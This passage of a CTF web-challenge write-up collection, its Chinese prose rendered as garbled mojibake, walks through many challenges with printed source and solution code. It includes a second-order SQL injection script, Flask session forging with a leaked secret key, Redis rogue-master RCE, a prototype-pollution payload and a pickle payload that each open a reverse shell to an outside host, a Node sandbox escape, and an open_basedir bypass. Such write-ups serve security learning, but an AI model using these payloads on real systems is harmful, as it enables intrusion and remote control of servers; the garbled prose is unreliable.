ip = request.remote_addr\n        ip = ip.encode(encoding='utf-8')\n        n.update(ip)\n        md5_ip = n.hexdigest()\n        f=request.files['file']\n        basepath=os.path.dirname(os.path.realpath(__file__))\n        path = basepath+'/upload/'+md5_ip+'/'+md5_one+'/'+session['username']+\"/\"\n        path_base = basepath+'/upload/'+md5_ip+'/'\n        filename = f.filename\n        pathname = path+filename\n        if \"zip\" != filename.split('.')[-1]:\n            return 'zip only allowed'\n        if not os.path.exists(path_base):\n            try:\n                os.makedirs(path_base)\n            except Exception as e:\n                return 'error'\n        if not os.path.exists(path):\n            try:\n                os.makedirs(path)\n            except Exception as e:\n                return 'error'\n        if not os.path.exists(pathname):\n            try:\n                f.save(pathname)\n            except Exception as e:\n                return 'error'\n        try:\n            cmd = \"unzip -n -d \"+path+\" \"+ pathname\n            if cmd.find('|') != -1 or cmd.find(';') != -1:\n\t\t\t\twaf()\n                return 'error'\n            os.system(cmd)\n        except Exception as e:\n            return 'error'\n        unzip_file = zipfile.ZipFile(pathname,'r')\n        unzip_filename = unzip_file.namelist()[0]\n        if session['is_login'] != True:\n            return 'not login'\n        try:\n            if unzip_filename.find('/') != -1:\n                shutil.rmtree(path_base)\n                os.mkdir(path_base)\n                return 'error'\n            image = open(path+unzip_filename, \"rb\").read()\n            resp = make_response(image)\n            resp.headers['Content-Type'] = 'image/png'\n            return resp\n        except Exception as e:\n            shutil.rmtree(path_base)\n            os.mkdir(path_base)\n            return 'error'\n    return render_template('upload.html')\n@app.route('/showflag')\ndef showflag():\n    if True == False:\n        image = open(os.path.join('./flag/flag.jpg'), \"rb\").read()\n        resp = make_response(image)\n        resp.headers['Content-Type'] = 'image/png'\n        return resp\n    else:\n        return \"can't give you\"\n```\n\nå¤§æ¦‚æµç¨‹å°±æ˜¯ï¼Œä¸Šä¼ ä¸€ä¸ªzipå‹ç¼©çš„å›¾ç‰‡ï¼Œç„¶åè§£å‹å¹¶è¿”å›å†…å®¹å±•ç¤ºï¼Œçœ‹åˆ°ä¸‹é¢flagåœ¨`./flag/flag.jpg`ä¸­ï¼Œä¼ªé€ è½¯è¿æ¥\n\n```\nzipå‘½ä»¤ä¸­\n-y ç›´æ¥ä¿å­˜ç¬¦å·è¿æ¥ï¼Œè€Œéè¯¥è¿æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶ï¼Œæœ¬å‚æ•°ä»…åœ¨UNIXä¹‹ç±»çš„ç³»ç»Ÿä¸‹æœ‰æ•ˆã€‚\n```\n\nå°†å…¶ä¸Šä¼ å³å¯\n\n## [ç½‘é¼æ¯2018]Unfinish\n\näºŒæ¬¡æ³¨å…¥å•ŠäºŒæ¬¡æ³¨å…¥\n\nå·ä¸ªè„šæœ¬\n\n```python\nimport base64   # ç”¨æ¥è§£16è¿›åˆ¶\nimport re       # æ­£åˆ™åŒ¹é…\nimport sys\nimport time\nimport requests\nurl=\"http://a13c51eb-d523-492b-82c0-82566d5c46a1.node4.buuoj.cn:81/\"\npayload=\"0'+(hex(hex((substr((select * from flag) from {} for 3)))))+'0\" ## å¿…é¡»ä¿è¯æœ‰flagè¡¨ï¼Œä¸”flagè¡¨é‡Œåªæœ‰ä¸€è¡Œä¸€åˆ—ï¼Œå¤šåˆ—éœ€è¦ä½¿ç”¨group_concatæ¥è¿æ¥\n\nresult=\"\"\ndef fund(txt):\n    t = re.findall(\"<span class=\\\"user-name\\\">\\n(.*?)</span>\", txt)\n    t = t[0].strip()\n    if not int(t) > 0:\n        sys.exit(1)\n    # t=base64.b16decode(t)\n    # t = base64.b16decode(t).decode(\"ascii\")\n    t=bytes.fromhex(t).decode('utf-8')  ### å¿…é¡»è¦æ±‚tä¸º str\n    t=bytes.fromhex(t).decode('utf-8')  ### bytes.fromhex è¿”å›ç»“æœæ˜¯bytesç±»å‹çš„\n    # print(t)\n    global result\n    result+=t\nfor  a in range(1,100):\n    register={\n        \"email\":\"1112223@1123111\"+str(a),\n        \"username\":payload.format((a-1)*3+1),\n        \"password\":\"123\"\n    }\n    login= {\n        \"email\": \"1112223@1123111\" + str(a),\n        \"password\": \"123\"\n     }\n    r=requests.session()\n    r1=r.post(url+\"register.php\",data=register)\n    if r1.status_code == 429:\n        time.sleep(3)\n    else:\n        r2=r.post(url+\"login.php\",data=login)\n        if r2.status_code==429:\n            time.sleep(3)\n        else:\n            r3=r.post(url+\"index.php\")\n            if r3.status_code ==429:\n                time.sleep(3)\n                r3 = r.post(url + \"index.php\")\n                fund(r3.text)\n            else:\n                fund(r3.text)\n\n    print(result)\n```\n\n## [CSAWQual 2016]i_got_id\n\nçœ‹ä»£ç ï¼Œå¯¹ä¸Šä¼ æ–‡ä»¶çš„å¤„ç†\n\n```\nif ($cgi->upload('file')) {\n    my $file = $cgi->param('file');\n    while (<$file>) {\n        print \"$_\";\n        print \"<br />\";\n    }\n}\n```\n\n> å…¶ä¸­`my $file= $cgi->param( 'file' );`ä¸­çš„`param()`å‡½æ•°è¿”å›ä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ã€‚ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥fileå˜é‡ä¸­ã€‚\n>\n> while ( <$file> )ä¸­ï¼Œ<>ä¸èƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œé™¤éæ˜¯ARGVï¼Œå› æ­¤å¾ªç¯éå†å¹¶å°†æ¯ä¸ªå€¼ä½¿ç”¨open()\n> è°ƒç”¨ã€‚\n>\n> å¯¹äºè¯»æ–‡ä»¶ï¼Œå¦‚æœä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚\n> æ‰€ä»¥ï¼Œåœ¨ä¸Šä¼ çš„æ­£å¸¸æ–‡ä»¶å‰åŠ ä¸Šä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡¹ARGVï¼Œç„¶ååœ¨URLä¸­ä¼ å…¥æ–‡ä»¶è·¯å¾„å‚æ•°ï¼Œå°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ã€‚\n\nARGVå°±æ˜¯å‘½ä»¤è¡Œå‚æ•°\n\n## [FBCTF2019]Event\n\nçœ‹å‚æ•°åœ¨event_importantå¤„æœ‰SSTIï¼Œå†çœ‹cookieä¸­æœ‰sessionï¼Œè‚¯å®šæ˜¯ä¼ªé€ æ²¡è·‘äº†ï¼Œå…ˆæå‡ºç§é’¥`__class__.__init__.__globals__[app].config`ï¼Œ` 'SECRET_KEY': 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'`ï¼Œç„¶åè„šæœ¬ä¼ªé€ å°±è¡Œäº†\n\n```python\nfrom flask import Flask\nfrom flask.sessions import SecureCookieSessionInterface\napp = Flask(__name__)\napp.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'\nsession_serializer = SecureCookieSessionInterface().get_signing_serializer(app)\n@app.route('/')\ndef index():\n    print(session_serializer.dumps(\"admin\"))\nindex()\n```\n\n## [ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe\n\nå…ˆä½¿ç”¨0.0.0.0æ‹¿åˆ°hintï¼Œ`redispass is root`ï¼Œè¯´æ˜ç›®æ ‡åº”è¯¥æ˜¯å¼€å¯äº†redisæœåŠ¡å¹¶ä¸”å¯†ç æ˜¯rootï¼Œæ­¤å¤„åˆ©ç”¨çš„æ˜¯Redisä¸»ä»å¤åˆ¶æ¥getshell\n\n> ### Redisä¸»ä»å¤åˆ¶\n>\n> Redisæ˜¯ä¸€ä¸ªä½¿ç”¨ANSI Cç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä½†å¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ªRedisçš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRediså°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚\n\næ‰€ä»¥æˆ‘ä»¬è¿™é¢˜çš„æ€è·¯æ˜¯ï¼Œåˆ›å»ºä¸€ä¸ªæ¶æ„çš„RedisæœåŠ¡å™¨ä½œä¸ºRedisä¸»æœºï¼ˆmasterï¼‰ï¼Œè¯¥Redisä¸»æœºèƒ½å¤Ÿå›åº”å…¶ä»–è¿æ¥ä»–çš„Redisä»æœºçš„å“åº”ã€‚æœ‰äº†æ¶æ„çš„Redisä¸»æœºä¹‹åï¼Œå°±ä¼šè¿œç¨‹è¿æ¥ç›®æ ‡RedisæœåŠ¡å™¨ï¼Œé€šè¿‡ slaveof å‘½ä»¤å°†ç›®æ ‡RedisæœåŠ¡å™¨è®¾ç½®ä¸ºæˆ‘ä»¬æ¶æ„Redisçš„Redisä»æœºï¼ˆslaverï¼‰ã€‚ç„¶åå°†æ¶æ„Redisä¸»æœºä¸Šçš„expåŒæ­¥åˆ°Reidsä»æœºä¸Šï¼Œå¹¶å°†dbfilenameè®¾ç½®ä¸ºexp.soã€‚æœ€åå†æ§åˆ¶Redisä»æœºï¼ˆslaverï¼‰åŠ è½½æ¨¡å—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å³å¯ã€‚\né¦–å…ˆéœ€è¦è¿™ä¸¤ä¸ªé¡¹ç›®\n\n[æ¶æ„so](https://github.com/n0b0dyCN/redis-rogue-server)\n\n[ä¼ªé€ ä¸»æœº](https://github.com/xmsec/redis-ssrf)\n\nå°†æ¶æ„soé¡¹ç›®ä¸­çš„exp.soæ–‡ä»¶æ”¾åˆ°ä¼ªé€ ä¸»æœºé¡¹ç›®çš„ç›®å½•ä¸­ï¼Œä¼ªé€ ä¸»æœºé¡¹ç›®ä¸­æ›´æ”¹ssrfé‚£ä¸ªpythonæ–‡ä»¶æ¥ç”Ÿæˆpayloadï¼Œç„¶åä½¿ç”¨serveræ–‡ä»¶æ¥å¼€å¯ä¼ªè£…æœåŠ¡å™¨ï¼Œä¼ å…¥æ‰§è¡Œå³å¯\n\n## [ç½‘é¼æ¯ 2020 é’é¾™ç»„]notes\n\nç»™æºç äº†ï¼Œç›´æ¥çœ‹é‡ç‚¹\n\n```javascript\nconst undefsafe = require('undefsafe');\nedit_note(id, author, raw) {\n    undefsafe(this.note_list, id + '.author', author);\n    undefsafe(this.note_list, id + '.raw_note', raw);\n}\napp.route('/edit_note')\n    .get(function(req, res) {\n        res.render('mess', {message: \"please use POST to edit a note\"});\n    })\n    .post(function(req, res) {\n        let id = req.body.id;\n        let author = req.body.author;\n        let enote = req.body.raw;\n        if (id && author && enote) {\n            notes.edit_note(id, author, enote);\n            res.render('mess', {message: \"edit note sucess\"});\n        } else {\n            res.render('mess', {message: \"edit note failed\"});\n        }\n    })\napp.route('/status')\n    .get(function(req, res) {\n        let commands = {\n            \"script-1\": \"uptime\",\n            \"script-2\": \"free -m\"\n        };\n        for (let index in commands) {\n            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {\n                if (err) {\n                    return;\n                }\n                console.log(`stdout: ${stdout}`);\n            });\n        }\n        res.send('OK');\n        res.end();\n    })\n\n```\n\nè°ƒç”¨äº†undefsafeæ¨¡å—ï¼Œè¯¥æ¨¡å—åœ¨ç‰ˆæœ¬å°äº2.0.3çš„æ—¶å€™å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´\n\n![](https://img-blog.csdnimg.cn/70ea2b9eee5c499f9bc3aa29c3ac94f7.png)\n\né—®é¢˜å°±å‡ºåœ¨å¯¹ä¸å­˜åœ¨çš„å±æ€§è¿›è¡Œèµ‹å€¼çš„æ—¶å€™ï¼Œä¼ å…¥`__proto__`å°±ä¼šå¯¼è‡´åŸå‹é“¾æ±¡æŸ“ï¼Œçœ‹ä»£ç ä¸­`undefsafe(this.note_list, id + '.author', author);`å…¶ä¸­idå’Œautheræˆ‘ä»¬éƒ½å¯æ§ï¼Œåœ¨authorå¤„æ”¾å…¥æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œidå¤„æ„é€ `__proto__`å³å¯å®ŒæˆåŸå‹é“¾æ±¡æŸ“ï¼Œå¯¼è‡´ä¿¡æ¯ä¼ å…¥å‘½ä»¤æ‰§è¡Œ\n\n```\nid=__proto__&author=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F43.249.193.167%2F38901%200%3E%261&raw=kkk\n```\n\n## [ç¾ŠåŸæ¯ 2020]Easyphp2\n\nè¿›å»å…ˆç”¨åŒURLç¼–ç ç»•è¿‡wafè¯»æºç \n\n```php\n    <?php\n    ini_set('max_execution_time', 5);\n    if ($_COOKIE['pass'] !== getenv('PASS')) {\n        setcookie('pass', 'PASS');\n        die('<h2>'.'<hacker>'.'<h2>'.'<br>'.'<h1>'.'404'.'<h1>'.'<br>'.'Sorry, only people from GWHT are allowed to access this website.'.'23333');\n    }\n    ?>\n    <?php\n    if (isset($_GET[\"count\"])) {\n        $count = $_GET[\"count\"];\n        if(preg_match('/;|base64|rot13|base32|base16|<\\?php|#/i', $count)){\n        \tdie('hacker!');\n        }\n        echo \"<h2>The Count is: \" . exec('printf \\'' . $count . '\\' | wc -c') . \"</h2>\";\n    }\n    ?>\n```\n\nè¯»robotsï¼Œå‘ç°check.php\n\n```php\n<?php\n$pass = \"GWHT\";\n// Cookie password.\necho \"Here is nothing, isn't it ?\";\nheader('Location: /');\n```\n\næ›´æ”¹cookieä¸­çš„passï¼Œå‡ºäº†ä¸ªæ–‡æœ¬æ¡†ï¼Œå†…å®¹ä¼ å…¥countè¢«æ‰§è¡Œï¼Œå†™ä¸ªshellè¿›å»ï¼Œç„¶åèšå‰‘è¿æ¥ï¼Œæ‰¾åˆ°flag.txtå‘ç°æ²¡æœ‰è¯»å–æƒé™ï¼Œçœ‹READMEè§£å‡ºå¯†ç `GWHTCTF`ï¼Œä½¿ç”¨suå‘½ä»¤åˆ‡æ¢ç”¨æˆ·ï¼Œè¯»å–flag\n\n```\nshell=system(\"printf 'GWHTCTF' | su  -c 'cat /GWHT/system/of/a/down/flag.txt' GWHT\");\n```\n\n## [HFCTF 2021 Final]easyflask\n\nè¯»æ–‡ä»¶ï¼Œè¯»æºç ï¼Œè¯»ä¸‹ç¯å¢ƒæ‰¾åˆ°`secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh`ï¼Œçœ‹sessionï¼Œæ˜æ˜¾ä¸€ä¸ªpickleï¼Œä¼ªé€ ä¸Šä¼ å°±è¡Œäº†\n\n```\n#!/usr/bin/python3.6\nimport os\nimport pickle\n\nfrom base64 import b64decode\nfrom flask import Flask, request, render_template, session\n\napp = Flask(__name__)\napp.config[\"SECRET_KEY\"] = \"*******\"\n\nUser = type('User', (object,), {\n    'uname': 'test',\n    'is_admin': 0,\n    '__repr__': lambda o: o.uname,\n})\n\n\n@app.route('/', methods=('GET',))\ndef index_handler():\n    if not session.get('u'):\n        u = pickle.dumps(User())\n        session['u'] = u\n    return \"/file?file=index.js\"\n\n\n@app.route('/file', methods=('GET',))\ndef file_handler():\n    path = request.args.get('file')\n    path = os.path.join('static', path)\n    if not os.path.exists(path) or os.path.isdir(path) \\\n            or '.py' in path or '.sh' in path or '..' in path or \"flag\" in path:\n        return 'disallowed'\n\n    with open(path, 'r') as fp:\n        content = fp.read()\n    return content\n\n\n@app.route('/admin', methods=('GET',))\ndef admin_handler():\n    try:\n        u = session.get('u')\n        if isinstance(u, dict):\n            u = b64decode(u.get('b'))\n        u = pickle.loads(u)\n    except Exception:\n        return 'uhh?'\n\n    if u.is_admin == 1:\n        return 'welcome, admin'\n    else:\n        return 'who are you?'\n\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80, debug=False)\n\n```\n\n```python\nimport pickle\nfrom base64 import b64encode\nimport os\n\nUser = type('User', (object,), {\n    'uname': 'test',\n    'is_admin': 1,\n    '__repr__': lambda o: o.uname,\n    '__reduce__': lambda o: (os.system, (\"bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'\",))\n\n})\nu = pickle.dumps(User())\nprint(b64encode(u).decode())\n```\n\n## [HITCON 2016]Leaking\n\nè¿™æ˜¯ä¸€é“å…³äºnode.jsæ²™ç®±é€ƒé€¸çš„é—®é¢˜\nå¤§è‡´è¯´ä¸€ä¸‹ é¢˜ç›®çš„æè¿°ï¼Œé¦–å…ˆå®šä¹‰å˜é‡flagï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨æ²™ç®±é‡Œé¢æ‰§è¡Œä»»æ„çš„å‘½ä»¤ï¼Œé‚£æˆ‘ä»¬å¦‚ä½•é€ƒé€¸å‡ºå»å‘¢ï¼Ÿ\n\n> åœ¨è¾ƒæ—©ä¸€ç‚¹çš„ node ç‰ˆæœ¬ä¸­ (8.0 ä¹‹å‰)ï¼Œå½“ Buffer çš„æ„é€ å‡½æ•°ä¼ å…¥æ•°å­—æ—¶, ä¼šå¾—åˆ°ä¸æ•°å­—é•¿åº¦ä¸€è‡´çš„ä¸€ä¸ª Bufferï¼Œå¹¶ä¸”è¿™ä¸ª Buffer æ˜¯æœªæ¸…é›¶çš„ã€‚8.0 ä¹‹åçš„ç‰ˆæœ¬å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªå‡½æ•° Buffer.allocUnsafe(size) æ¥è·å¾—æœªæ¸…ç©ºçš„å†…å­˜ã€‚ \n\nè¯¥é¢˜ç¯å¢ƒæ˜¯8.0å‰ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨Bufferè¯»å–å†…å­˜å†…å®¹å³å¯\n\n```python\nimport requests\nimport time\nurl = 'http://39115099-9d08-4235-a5d8-300bf6b9ad57.node4.buuoj.cn:81/?data=Buffer(500)'\nresponse = ''\nwhile 'flag' not in response:\n        req = requests.get(url)\n        response = req.text\n        print(req.status_code)\n        time.sleep(0.1)\n        if 'flag{' in response:\n            print(response)\n            break\n```\n\n## [NPUCTF2020]éªŒè¯ğŸ\n\nç»™äº†æºç ï¼Œå°±ä¸æ”¾äº†ï¼Œç›´æ¥çœ‹å…³é”®ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªmd5ç»•è¿‡ï¼Œåˆ©ç”¨jså¼±ç±»å‹ç›¸åŠ ã€\n\n```\n[1]+'1' //'11'\n'1'+'1' //'11'\n[1]!=='1'\n```\n\n```\nif (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0]))\n```\n\nç„¶åå°±æ˜¯ä¼ å…¥çš„å†…å®¹\n\n```javascript\nfunction saferEval(str) {\n  if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\n    return null;\n  }\n  return eval(str);\n}\n```\n\nè¿™é‡Œæ­£åˆ™ä¼šå‘ç°å¯ç”¨å‡½æ•°åªæœ‰Mathï¼Œæ­¤å¤„ä½¿ç”¨å°–å¤´å‡½æ•°åŠ åŸå‹æ¥æ‰§è¡Œ\n\n```\nfunction (x) {\n    return x * x;\n}\nè¯¥å‡½æ•°ä½¿ç”¨ç®­å¤´å‡½æ•°å¯ä»¥ä½¿ç”¨ä»…ä»…ä¸€è¡Œä»£ç æå®šï¼\nx => x * x\n```\n\næ­¤å¤„å–MathåŸå‹å¯å¾—åˆ°Function\n\n```\nMath.constructor.constructor\n```\n\nåˆå› ä¸ºä¸èƒ½ç›´æ¥ä¼ å…¥å‘½ä»¤æ‰§è¡Œï¼Œä½¿ç”¨Stringä¸­çš„String.fromCharCode()æ¥å°†æ•°å­—è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå†åˆ©ç”¨jsä¸­å¼±ç±»å‹ç›¸åŠ æ„é€ å‡ºå­—ç¬¦ä¸²ç±»ï¼Œæ„é€ å‡ºå¦‚ä¸‹payload\n\n```javascript\n(Math=>\n        (Math=Math.constructor,//æ­¤å¤„ç±»å‹ä¸ºÆ’ String() { [native code] }\n                Math.x=Math.constructor(\n  \t\t\t\t\t\t\t//æ­¤å¤„ç±»å‹ä¸ºÆ’ Function() { [native code] }ï¼Œç”Ÿæˆä¸€ä¸ªåŒ¿åå‡½æ•°\n                    Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,\n                        99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,\n                        46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,\n                        95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,\n                        121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()\n        )\n)(Math+1)\n```\n\nåŒæ—¶ä½¿ç”¨äº†ç®­å¤´å‡½æ•°å’Œè‡ªè°ƒç”¨å‡½æ•°ï¼Œ+1å°†Mathè½¬æ¢ä¸ºStringç±»å‹ä¼ å…¥ï¼Œè€Œåé€šè¿‡Functionæ„é€ å‡ºä¸€ä¸ªå‡½æ•°å¹¶è¿›è¡Œè‡ªè°ƒç”¨æ¥å°†è¿”å›å€¼ä¼ å…¥Math.xï¼Œæœ€ç»ˆçš„è¿”å›å€¼ä¹Ÿå°±æ˜¯Math.xçš„å€¼\n\n## [CISCN2021 Quals]upload\n\nä¿©æ–‡ä»¶ï¼Œä¸€ä¸ªuploadï¼Œä¸€ä¸ªexample\n\n```php\n//upload\n<?php\nif (!isset($_GET[\"ctf\"])) {\n    highlight_file(__FILE__);\n    die();\n}\n\nif(isset($_GET[\"ctf\"]))\n    $ctf = $_GET[\"ctf\"];\n\nif($ctf==\"upload\") {\n    if ($_FILES['postedFile']['size'] > 1024*512) {\n        die(\"è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ\");\n    }\n    $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']);\n    if ($imageinfo === FALSE) {\n        die(\"å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†\");\n    }\n    if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1) {\n        die(\"ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ\");\n    }\n    $fileName=urldecode($_FILES['postedFile']['name']);\n    if(stristr($fileName,\"c\") || stristr($fileName,\"i\") || stristr($fileName,\"h\") || stristr($fileName,\"ph\")) {\n        die(\"æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†\");\n    }\n    $imagePath = \"image/\" . mb_strtolower($fileName);\n    if(move_uploaded_file($_FILES[\"postedFile\"][\"tmp_name\"], $imagePath)) {\n        echo \"upload success, image at $imagePath\";\n    } else {\n        die(\"ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»\");\n    }\n}\n```\n\n```php\n//example\n<?php\nif (!isset($_GET[\"ctf\"])) {\n    highlight_file(__FILE__);\n    die();\n}\n\nif(isset($_GET[\"ctf\"]))\n    $ctf = $_GET[\"ctf\"];\n\nif($ctf==\"poc\") {\n    $zip = new \\ZipArchive();\n    $name_for_zip = \"example/\" . $_POST[\"file\"];\n    if(explode(\".\",$name_for_zip)[count(explode(\".\",$name_for_zip))-1]!==\"zip\") {\n        die(\"è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ\");\n    }\n    if ($zip->open($name_for_zip) !== TRUE) {\n        die (\"éƒ½ä¸èƒ½è§£å‹å‘¢\");\n    }\n\n    echo \"å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ\";\n    $pos_for_zip = \"/tmp/example/\" . md5($_SERVER[\"REMOTE_ADDR\"]);\n    $zip->extractTo($pos_for_zip);\n    $zip->close();\n    unlink($name_for_zip);\n    $files = glob(\"$pos_for_zip/*\");\n    foreach($files as $file){\n        if (is_dir($file)) {\n            continue;\n        }\n        $first = imagecreatefrompng($file);\n        $size = min(imagesx($first), imagesy($first));\n        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);\n        if ($second !== FALSE) {\n            $final_name = pathinfo($file)[\"basename\"];\n            imagepng($second, 'example/'.$final_name);\n            imagedestroy($second);\n        }\n        imagedestroy($first);\n        unlink($file);\n    }\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [ç¾ŠåŸæ¯ 2020]Blackcat\n\néŸ³é¢‘æœ€åæœ‰æºç \n\n```\n<?php\ninclude \"initialized.php\";\nputenv(\"clandestine=\".randomkeys());\nif(empty($_POST['Black-Cat-Sheriff']) || empty($_POST['One-ear'])){\n    die('è°ï¼ç«Ÿæ•¢è¸©æˆ‘ä¸€åªè€³çš„å°¾å·´ï¼');\n}\n$clandestine = getenv(\"clandestine\");\nif(isset($_POST['White-cat-monitor']))\n    $clandestine = hash_hmac('sha256', $_POST['White-cat-monitor'], $clandestine);\n$hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine);\nif($hh !== $_POST['Black-Cat-Sheriff']){\n    die('æœ‰æ„ç„å‡†ï¼Œæ— æ„å‡»å‘ï¼Œä½ çš„æ¢¦æƒ³å°±æ˜¯ä½ è¦ç„å‡†çš„ç›®æ ‡ã€‚ç›¸ä¿¡è‡ªå·±ï¼Œä½ å°±æ˜¯é‚£é¢—å°„ä¸­é¶å¿ƒçš„å­å¼¹ã€‚');\n}\necho exec(\"nc\".$_POST['One-ear']);\n?>\n```\n\nhash_hmacå‡½æ•°å¦‚æœä¼ å…¥çš„å‚æ•°ä¸ºæ•°å­—ä¼šè¿”å›falseï¼Œé‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶$clandestineä¸ºfalseï¼Œè¿›è€Œæ§åˆ¶å“ˆå¸Œå€¼è®©å‘½ä»¤æ‰§è¡Œ\n\n## [è“å¸½æ¯ 2021]One Pointer PHP\n\nç»™äº†æºç \n\n```php\n<?php\ninclude \"user.php\";\nif($user=unserialize($_COOKIE[\"data\"])){\n\t$count[++$user->count]=1;\n\tif($count[]=1){\n\t\t$user->count+=1;\n\t\tsetcookie(\"data\",serialize($user));\n\t}else{\n\t\teval($_GET[\"backdoor\"]);\n\t}\n}else{\n\t$user=new User;\n\t$user->count=1;\n\tsetcookie(\"data\",serialize($user));\n}\n?>\n```\n\nPHPæ•´æ•°æº¢å‡º\n\n> å¦‚æœç»™å®šçš„ä¸€ä¸ªæ•´æ•°è¶…å‡ºäº†æ•´å‹ï¼ˆintegerï¼‰çš„èŒƒå›´ï¼Œå°†ä¼šè¢«è§£é‡Šä¸ºæµ®ç‚¹å‹ï¼ˆfloatï¼‰ã€‚åŒæ ·å¦‚æœæ‰§è¡Œçš„è¿ç®—ç»“æœè¶…å‡ºäº†æ•´å‹ï¼ˆintegerï¼‰èŒƒå›´ï¼Œä¹Ÿä¼šè¿”å›æµ®ç‚¹å‹ï¼ˆfloatï¼‰ã€‚\n>\n\næ„é€ ä¸€ä¸ªconutè¶…å‡ºintå°±èƒ½è®©åˆ¤æ–­ä¸ºfalseï¼Œæ‰§è¡Œå‘½ä»¤\n\n```\nO:4:\"User\":1:{s:5:\"count\";i:9223372036854775806;}\n```\n\nçœ‹phpinfoï¼Œbanå¤§é‡å‘½ä»¤ï¼Œå¹¶ä¸”è®¾ç½®äº†open_basedirï¼Œé‚£ä¹ˆå…ˆç»•è¿‡è¿™ä¸ªå§\n\n```php\nmkdir(\"s\");\nchdir('s');\nini_set('open_basedir','..');\nchdir('..');\nchdir('..');\nchdir('..');\nchdir('..');\nini_set('open_basedir','/');\nreadfile('/flag')\n```\n\næ²¡æƒé™è¯»å•Šï¼Œè¯•è¯•è¯»ä¸€ä¸‹cmdlineï¼Œå’Œnginxé…ç½®æ–‡ä»¶\n\n```shell\nphp-fpm: pool www\n```\n\næ˜¯phpfpmï¼Œå¯ä»¥åˆ©ç”¨SSRFï¼Œè¯»å–phpfpmçš„é…ç½®æ–‡ä»¶\n\n```\nlisten = 127.0.0.1:9001\n```\n\nåœ¨9001ç«¯å£ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯SSRFäº†\n\n> ### SSRFæ”»å‡»FPM\n>\n> æˆ‘ä»¬å¯ä»¥é€šè¿‡SSRFæ¥æ”»å‡»FPMï¼Œä½†æ˜¯å—é™äºè¿™é“é¢˜çš„disable_functionsï¼Œæˆ‘ä»¬æ— 